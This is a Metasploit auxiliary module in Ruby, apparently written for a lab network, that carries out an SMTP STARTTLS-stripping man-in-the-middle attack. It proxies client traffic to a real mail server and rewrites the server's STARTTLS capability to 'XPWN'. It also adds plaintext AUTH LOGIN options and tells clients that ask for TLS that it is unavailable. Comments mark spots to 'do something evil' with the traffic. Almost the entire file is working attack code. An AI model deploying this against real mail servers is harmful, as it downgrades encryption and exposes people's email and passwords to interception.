require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	
	# mixin Tcp
	include Msf::Exploit::Remote::Tcp
	# create alias methods
	alias_method :cleanup_tcp, :cleanup
	alias_method :run_tcp, :run
	# mixin TcpServer
	include Msf::Exploit::Remote::TcpServer
	# create alias methods
	alias_method :cleanup_tcpserver, :cleanup
	alias_method :run_tcpserver, :run
	alias_method :exploit_tcpserver, :exploit


	def initialize(info = {})
		super(update_info(info,
			'Name' => 'smtp strip starttls module',
			'Description' => %q{ well well well },
			'Author' => 'f0rki',
			'License' => BSD_LICENSE,
			#'DisclosureDate' => '2012',
			)
			)

		# in my case I didn't need this SSL stuff
		deregister_options('SSL', 'SSLCert', 'SSLVersion', 'RPORT')
	
		register_options(
			[
				OptPort.new('SRVPORT', [ true, "service port", 25 ]),
				OptString.new('SRVHOST', [ true, "local listen address", "0.0.0.0" ]),
				OptString.new('RHOST', [ true, "the actual server", "10.42.42.10" ]),
			], self.class)
		
		# let's still put this here
		datastore["RPORT"] = datastore["SRVPORT"]
	end


	# run tcp server, i.e. start listening port
	def run
		exploit_tcpserver
	end
	alias_method :exploit, :run
	
	# cleanup method, which calls both Tcp and TcpServer cleanup
	def cleanup
		cleanup_tcp()
		cleanup_tcpserver()
	end
	
	# client connected, so we let the Tcp mixin connect
	def on_client_connect(client)
		print_status("client connected " + client.peerinfo())
		connect()
		begin
			# receive data from server
			respdata = sock.get_once()
			return if respdata.nil? or respdata.length == 0
			
			# print traffic
			print_status("received the following from server")
			print_status(Rex::Text::to_hex_dump(respdata))

			if not respdata.index("250-STARTTLS").nil?
				respdata = strip_capabilities(respdata)
				print_status("sending the following to the client")
				print_status(Rex::Text::to_hex_dump(respdata))
			end
			
			# send data back to client			
			client.put(respdata)

		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::Exception
			print_status("Error: #{$!.class} #{$!} #{$!.backtrace}")
		end

	end

	# client disconnected, so we let the Tcp mixin disconnect
	def on_client_close(client)
		print_status("client disconnected " + client.peerinfo())
		disconnect() # disconnect to actual server
	end

	def perror_exit(errmsg)
		print_status(errmsg)
		disconnect() # diconnect from the actual server
		stop_service() # stop our service
	end



	def on_client_data(client)
		begin
			# receive from client
			data = client.get_once()
			return if data.nil? or data.length == 0
			
			# print traffic
			print_status("received the following from client")
			print_status(Rex::Text::to_hex_dump(data))

			# check if client requested STARTTLS
			if not data.match(/^STARTTLS$/).nil?
				#perror_exit("Client still requested STARTTLS")
                                # return
				print_status("Client still requested STARTTLS")
                                respdata = "454 TLS not available due to temporary reason"
                                client.put(respdata)
                                print_status("sending the following to the client")
				print_status(Rex::Text::to_hex_dump(respdata))
			end

			if not data.match(/^QUIT$/).nil?
				perror_exit("Client quit")
				#print_status("Client still requested STARTTLS")
			end
			
			### do something evil with the tcp data here
			
			# send data to server
			sock.send(data, 0)
			# receive data from server
			respdata = sock.get_once()
			return if respdata.nil? or respdata.length == 0
			
			# print traffic
			print_status("received the following from server")
			print_status(Rex::Text::to_hex_dump(respdata))
			
			### do something evil with the tcp data here
	
			if not respdata.index("250-STARTTLS").nil?
				respdata = strip_capabilities(respdata)
				print_status("sending the following to the client")
				print_status(Rex::Text::to_hex_dump(respdata))
			end

			# send data back to client			
			client.put(respdata)
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::Exception
			print_status("Error: #{$!.class} #{$!} #{$!.backtrace}")
		end
	end

	def strip_capabilities(data)
		data.sub!("250-STARTTLS\r\n", "250-XPWN\r\n")
		data << "250-AUTH\r\n250-AUTH=LOGIN\r\n"
		return data
	end

end
